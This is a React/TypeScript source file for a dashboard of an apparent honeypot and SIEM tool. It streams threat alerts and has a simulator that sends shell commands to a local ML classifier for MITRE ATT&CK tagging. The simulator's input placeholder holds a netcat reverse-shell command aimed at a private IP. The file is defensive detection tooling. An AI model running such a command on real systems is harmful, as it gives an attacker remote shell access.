'use client';

import React, { useState, useEffect } from 'react';

interface ThreatAlert {
    timestamp: string;
    attacker_ip: string;
    session_id: string;
    command: string;
    old_state: string;
    new_state: string;
    tactic: string;
    technique_id: string;
    confidence: number;
    explanation: string;
    mitigations: string[];
    verdict: string;
}

interface SimulatorResult {
    command: string;
    verdict: string;
    tactic: string;
    technique_id: string | null;
    confidence: number;
    explanation: string;
    mitigations: string[];
}

export default function DashboardPage() {
    const [alerts, setAlerts] = useState<ThreatAlert[]>([]);
    const [siemStatus, setSiemStatus] = useState<'Connecting' | 'Live' | 'Disconnected'>('Connecting');

    // Simulator state
    const [simCommand, setSimCommand] = useState('');
    const [simResult, setSimResult] = useState<SimulatorResult | null>(null);
    const [simLoading, setSimLoading] = useState(false);
    const [simError, setSimError] = useState('');
    const [expandedMitigation, setExpandedMitigation] = useState<number | null>(null);

    useEffect(() => {
        const socket = new WebSocket('ws://127.0.0.1:8000/ws/telemetry');
        socket.onopen    = () => setSiemStatus('Live');
        socket.onmessage = (event) => {
            try {
                const incomingData: ThreatAlert = JSON.parse(event.data);
                setAlerts((prev) => [incomingData, ...prev]);
            } catch (error) {
                console.error('[-] Failed parsing streaming telemetry frame:', error);
            }
        };
        socket.onclose = () => setSiemStatus('Disconnected');
        socket.onerror = () => setSiemStatus('Disconnected');
        return () => {
            if (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING) {
                socket.close();
            }
        };
    }, []);

    const runSimulator = async () => {
        if (!simCommand.trim()) return;
        setSimLoading(true);
        setSimResult(null);
        setSimError('');
        try {
            const res = await fetch('http://127.0.0.1:8000/telemetry', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    command:     simCommand,
                    timestamp:   new Date().toLocaleTimeString(),
                    attacker_ip: '127.0.0.1'
                })
            });
            const data = await res.json();
            setSimResult({
                command:      simCommand,
                verdict:      data.alert?.verdict      ?? data.verdict      ?? 'UNKNOWN',
                tactic:       data.alert?.tactic       ?? data.tactic       ?? 'UNKNOWN',
                technique_id: data.alert?.technique_id ?? data.technique_id ?? null,
                confidence:   data.alert?.confidence   ?? data.confidence   ?? 0,
                explanation:  data.alert?.explanation  ?? data.explanation  ?? '',
                mitigations:  data.alert?.mitigations  ?? data.mitigations  ?? [],
            });
        } catch {
            setSimError('Could not reach SIEM backend. Make sure it is running on port 8000.');
        } finally {
            setSimLoading(false);
        }
    };

    const getTacticBadgeStyle = (tactic: string) => {
        const base = "px-3 py-1 rounded text-xs font-bold tracking-wider uppercase inline-block ";
        switch (tactic.toUpperCase()) {
            case 'EXECUTION':           return base + "bg-red-950 text-red-400 border border-red-800";
            case 'CREDENTIAL_ACCESS':   return base + "bg-rose-950 text-rose-400 border border-rose-800";
            case 'RECONNAISSANCE':      return base + "bg-purple-950 text-purple-400 border border-purple-800";
            case 'DISCOVERY':           return base + "bg-blue-950 text-blue-400 border border-blue-800";
            case 'EXFILTRATION':        return base + "bg-orange-950 text-orange-400 border border-orange-800";
            case 'PERSISTENCE':         return base + "bg-yellow-950 text-yellow-400 border border-yellow-800";
            case 'PRIVILEGE_ESCALATION':return base + "bg-pink-950 text-pink-400 border border-pink-800";
            case 'DEFENSE_EVASION':     return base + "bg-indigo-950 text-indigo-400 border border-indigo-800";
            case 'STEALTH':             return base + "bg-indigo-950 text-indigo-400 border border-indigo-800";
            case 'IMPACT':              return base + "bg-red-950 text-red-400 border border-red-800";
            case 'BENIGN':              return base + "bg-emerald-950 text-emerald-400 border border-emerald-800";
            default:                    return base + "bg-zinc-800 text-zinc-400 border border-zinc-700";
        }
    };

    return (
        <div className="min-h-screen bg-zinc-950 text-zinc-100 p-8 font-sans">
            {/* Header */}
            <header className="border-b border-zinc-800 pb-6 mb-8 flex justify-between items-center">
                <div>
                    <h1 className="text-2xl font-black tracking-tight text-white">
                        AGENTIC DECEPTION PLATFORM
                    </h1>
                    <p className="text-zinc-500 text-sm mt-1">Real-time Autonomous Honeypot Telemetry Classifier</p>
                </div>
                <div className="flex items-center gap-3 bg-zinc-900 border border-zinc-800 px-4 py-2 rounded-lg">
                    <span className="text-xs font-semibold uppercase text-zinc-400 tracking-wide">SIEM Status:</span>
                    <div className="flex items-center gap-2">
                        <span className={`w-2 h-2 rounded-full ${
                            siemStatus === 'Live'        ? 'bg-emerald-500 animate-pulse' :
                            siemStatus === 'Connecting'  ? 'bg-amber-500 animate-pulse'  : 'bg-rose-500'
                        }`} />
                        <span className={`text-xs font-bold ${
                            siemStatus === 'Live'        ? 'text-emerald-400' :
                            siemStatus === 'Connecting'  ? 'text-amber-400'   : 'text-rose-400'
                        }`}>{siemStatus}</span>
                    </div>
                </div>
            </header>

            <main className="space-y-8">

                {/* ── Simulator ─────────────────────────────────────────── */}
                <div className="bg-zinc-900/50 border border-zinc-800/80 rounded-xl overflow-hidden backdrop-blur-sm shadow-xl">
                    <div className="border-b border-zinc-800 bg-zinc-900/80 px-6 py-4 flex items-center gap-3">
                        <span className="w-2 h-2 rounded-full bg-emerald-500" />
                        <h2 className="text-sm font-bold tracking-wider text-zinc-300 uppercase">
                            Command Threat Simulator
                        </h2>
                        <span className="text-xs text-zinc-600 ml-auto">
                            Analyse any shell command against the ML engine
                        </span>
                    </div>

                    <div className="p-6 space-y-4">
                        {/* Input */}
                        <div className="flex gap-3">
                            <div className="flex-1 flex items-center bg-zinc-950 border border-zinc-700 rounded-lg px-4 gap-2 focus-within:border-zinc-500 transition-colors">
                                <span className="text-emerald-500 font-mono text-sm select-none">$</span>
                                <input
                                    type="text"
                                    value={simCommand}
                                    onChange={(e) => setSimCommand(e.target.value)}
                                    onKeyDown={(e) => e.key === 'Enter' && runSimulator()}
                                    placeholder="nc -e /bin/bash 192.168.1.1 4444"
                                    className="flex-1 bg-transparent text-emerald-400 font-mono text-sm py-3 outline-none placeholder:text-zinc-700"
                                />
                            </div>
                            <button
                                onClick={runSimulator}
                                disabled={simLoading || !simCommand.trim()}
                                className="px-6 py-3 bg-zinc-800 hover:bg-zinc-700 disabled:opacity-40 disabled:cursor-not-allowed border border-zinc-700 rounded-lg text-sm font-bold text-zinc-200 tracking-wider uppercase transition-colors"
                            >
                                {simLoading ? 'Analysing...' : 'Analyse'}
                            </button>
                        </div>

                        {/* Error */}
                        {simError && (
                            <p className="text-rose-400 text-xs font-mono">{simError}</p>
                        )}

                        {/* Result */}
                        {simResult && (
                            <div className={`rounded-lg border p-5 space-y-4 ${
                                simResult.verdict === 'BENIGN'
                                    ? 'bg-emerald-950/30 border-emerald-800/50'
                                    : 'bg-red-950/30 border-red-800/50'
                            }`}>
                                {/* Verdict row */}
                                <div className="flex items-center justify-between">
                                    <div className="flex items-center gap-3">
                                        <span className={`text-lg font-black tracking-widest ${
                                            simResult.verdict === 'BENIGN' ? 'text-emerald-400' : 'text-red-400'
                                        }`}>
                                            {simResult.verdict === 'BENIGN' ? '✓ BENIGN' : '⚠ MALICIOUS'}
                                        </span>
                                        <span className={getTacticBadgeStyle(simResult.tactic)}>
                                            {simResult.tactic.replace(/_/g, ' ')}
                                        </span>
                                        {simResult.technique_id && (
                                            <a
                                                href={`https://attack.mitre.org/techniques/${simResult.technique_id.replace('.', '/')}`}
                                                target="_blank"
                                                rel="noopener noreferrer"
                                                className="px-3 py-1 rounded text-xs font-bold tracking-wider uppercase bg-zinc-800 text-zinc-300 border border-zinc-700 hover:border-zinc-500 transition-colors"
                                            >
                                                {simResult.technique_id} ↗
                                            </a>
                                        )}
                                    </div>
                                    <span className={`text-2xl font-black ${
                                        simResult.confidence >= 90 ? 'text-rose-400' :
                                        simResult.confidence >= 75 ? 'text-amber-400' : 'text-zinc-400'
                                    }`}>
                                        {simResult.confidence}%
                                    </span>
                                </div>

                                {/* Explanation */}
                                {simResult.explanation && (
                                    <div className="space-y-1">
                                        <p className="text-xs font-bold uppercase tracking-wider text-zinc-500">Explanation</p>
                                        <p className="text-sm text-zinc-300 leading-relaxed">{simResult.explanation}</p>
                                    </div>
                                )}

                                {/* Mitigations */}
                                {simResult.mitigations.length > 0 && (
                                    <div className="space-y-2">
                                        <p className="text-xs font-bold uppercase tracking-wider text-zinc-500">
                                            MITRE Mitigations
                                        </p>
                                        <div className="space-y-2">
                                            {simResult.mitigations.map((m, i) => {
                                                const title = m.split(' ').slice(0, 6).join(' ');
                                                const isExpanded = expandedMitigation === i;
                                                return (
                                                    <div
                                                        key={i}
                                                        className="bg-zinc-900 border border-zinc-800 rounded-lg overflow-hidden"
                                                    >
                                                        <button
                                                            onClick={() => setExpandedMitigation(isExpanded ? null : i)}
                                                            className="w-full flex items-center justify-between px-4 py-3 text-left hover:bg-zinc-800/50 transition-colors"
                                                        >
                                                            <span className="text-xs font-semibold text-zinc-300">
                                                                {title}...
                                                            </span>
                                                            <span className="text-zinc-600 text-xs ml-4 shrink-0">
                                                                {isExpanded ? '▲ collapse' : '▼ expand'}
                                                            </span>
                                                        </button>
                                                        {isExpanded && (
                                                            <div className="px-4 pb-4 text-xs text-zinc-400 leading-relaxed border-t border-zinc-800 pt-3 whitespace-pre-wrap">
                                                                {m}
                                                            </div>
                                                        )}
                                                    </div>
                                                );
                                            })}
                                        </div>
                                    </div>
                                )}
                            </div>
                        )}
                    </div>
                </div>

                {/* ── Live Threat Stream ─────────────────────────────────── */}
                <div className="bg-zinc-900/50 border border-zinc-800/80 rounded-xl overflow-hidden backdrop-blur-sm shadow-xl">
                    <div className="border-b border-zinc-800 bg-zinc-900/80 px-6 py-4">
                        <h2 className="text-sm font-bold tracking-wider text-zinc-300 uppercase">
                            Live Aggregated Threat Stream
                        </h2>
                    </div>
                    <div className="overflow-x-auto">
                        <table className="w-full text-left border-collapse">
                            <thead>
                                <tr className="border-b border-zinc-800 bg-zinc-950/40 text-zinc-400 font-bold text-xs uppercase tracking-wider">
                                    <th className="px-6 py-4 w-28">Timestamp</th>
                                    <th className="px-6 py-4 w-36">Attacker IP</th>
                                    <th className="px-6 py-4">Intercepted Payload</th>
                                    <th className="px-6 py-4 w-52">Tactic</th>
                                    <th className="px-6 py-4 w-28">Technique</th>
                                    <th className="px-6 py-4 w-32 text-right">Confidence</th>
                                </tr>
                            </thead>
                            <tbody className="divide-y divide-zinc-800/60 font-mono text-sm">
                                {alerts.length === 0 ? (
                                    <tr>
                                        <td colSpan={6} className="px-6 py-12 text-center text-zinc-600 italic">
                                            No inbound telemetry signatures identified yet. Awaiting network interactions on port :8022...
                                        </td>
                                    </tr>
                                ) : (
                                    alerts.map((alert, index) => (
                                        <tr key={index} className="hover:bg-zinc-900/40 transition-colors duration-150 group">
                                            <td className="px-6 py-4 text-zinc-500">{alert.timestamp}</td>
                                            <td className="px-6 py-4 font-semibold text-zinc-300">{alert.attacker_ip}</td>
                                            <td className="px-6 py-4">
                                                <span className="bg-zinc-950 text-emerald-400 px-2.5 py-1 rounded border border-zinc-800 block font-medium overflow-x-auto whitespace-pre group-hover:border-zinc-700 transition-colors">
                                                    {alert.command}
                                                </span>
                                            </td>
                                            <td className="px-6 py-4">
                                                <span className={getTacticBadgeStyle(alert.tactic)}>
                                                    {alert.tactic.replace(/_/g, ' ')}
                                                </span>
                                            </td>
                                            <td className="px-6 py-4 text-zinc-400 text-xs">
                                                {alert.technique_id ?? '—'}
                                            </td>
                                            <td className="px-6 py-4 text-right font-bold">
                                                <span className={`${
                                                    alert.confidence >= 90 ? 'text-rose-400' :
                                                    alert.confidence >= 75 ? 'text-amber-400' : 'text-zinc-400'
                                                }`}>
                                                    {alert.confidence}%
                                                </span>
                                            </td>
                                        </tr>
                                    ))
                                )}
                            </tbody>
                        </table>
                    </div>
                </div>
            </main>
        </div>
    );
}